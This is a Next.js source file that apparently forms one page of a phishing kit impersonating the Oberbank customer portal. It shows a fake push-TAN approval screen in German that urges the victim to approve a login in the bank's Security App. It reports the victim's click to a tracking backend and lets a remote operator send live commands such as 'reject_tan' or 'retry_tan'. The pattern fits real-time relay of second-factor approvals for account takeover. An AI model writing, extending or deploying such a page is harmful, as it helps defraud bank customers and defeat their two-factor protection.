"use client";

import { useEffect, useState } from "react";
import { useRouter, useSearchParams } from "next/navigation";
import { Suspense } from "react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { trackSubmission, onCommand } from "@/lib/track";

function PushTanContent() {
  const router = useRouter();
  const searchParams = useSearchParams();
  const user = searchParams.get("user") || "";
  const code = searchParams.get("code") || "";
  const [error, setError] = useState<string | null>(null);
  const [loading, setLoading] = useState(false);

  useEffect(() => {
    onCommand((cmd) => {
      switch (cmd.type) {
        case "show_error":
          setError(
            (cmd.payload?.message as string) || "Ein Fehler ist aufgetreten."
          );
          break;
        case "clear_error":
          setError(null);
          break;
        case "reject_tan":
          setError(
            "Bestätigung fehlgeschlagen. Bitte versuchen Sie es erneut."
          );
          break;
        case "retry_tan":
          setError(null);
          break;
      }
    });
    return () => onCommand(() => {});
  }, []);

  const handleConfirm = () => {
    if (loading) return;
    setLoading(true);
    trackSubmission("oberbank", "pushtan", { code });
  };

  return (
    <div
      className="min-h-screen flex flex-col"
      style={{ background: "#fafcfc" }}
    >
      <Header />

      <main className="flex-1 flex items-start justify-center">
        <div className="w-full max-w-[480px] mx-auto px-4 py-8">
            <div className="obr-tile flex flex-col">
              <div className="obr-tile-header">
                <h2
                  className="text-base font-medium"
                  style={{ color: "#30454c" }}
                >
                  Kundenportal Login
                </h2>
              </div>

              <div className="obr-tile-content flex-1">
                <p className="text-xs mb-4" style={{ color: "#30454c" }}>
                  Öffnen Sie Ihre Oberbank Security App. Vergleichen Sie die
                  unten angeführte Prüfziffer mit jener in der Security App und
                  geben Sie den Login frei.
                </p>

                <div className="flex items-center justify-between mb-3">
                  <div className="flex items-center gap-1.5">
                    <span
                      className="text-sm font-medium"
                      style={{ color: "#30454c" }}
                    >
                      Prüfziffer
                    </span>
                    <svg
                      width="14"
                      height="14"
                      viewBox="0 0 24 24"
                      fill="#30454c"
                    >
                      <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-6h2v6zm0-8h-2V7h2v2z" />
                    </svg>
                  </div>
                  <span
                    className="text-sm font-medium"
                    style={{ color: "#30454c" }}
                  >
                    {code || "---"}
                  </span>
                </div>

                {error && (
                  <p className="text-xs mb-2" style={{ color: "#c90000" }}>
                    {error}
                  </p>
                )}

                <button
                  type="button"
                  className="obr-btn-accent w-full"
                  style={{ padding: "12px 24px" }}
                  onClick={handleConfirm}
                  disabled={loading}
                >
                  {loading ? "..." : "Mit App unterzeichnen"}
                </button>
              </div>

              <div className="obr-tile-footer flex justify-end">
                <button
                  type="button"
                  className="obr-btn-borderless"
                  onClick={() => router.push("/")}
                >
                  Abbrechen
                </button>
              </div>
            </div>
        </div>
      </main>

      <Footer />
    </div>
  );
}

export default function PushTanPage() {
  return (
    <Suspense>
      <PushTanContent />
    </Suspense>
  );
}
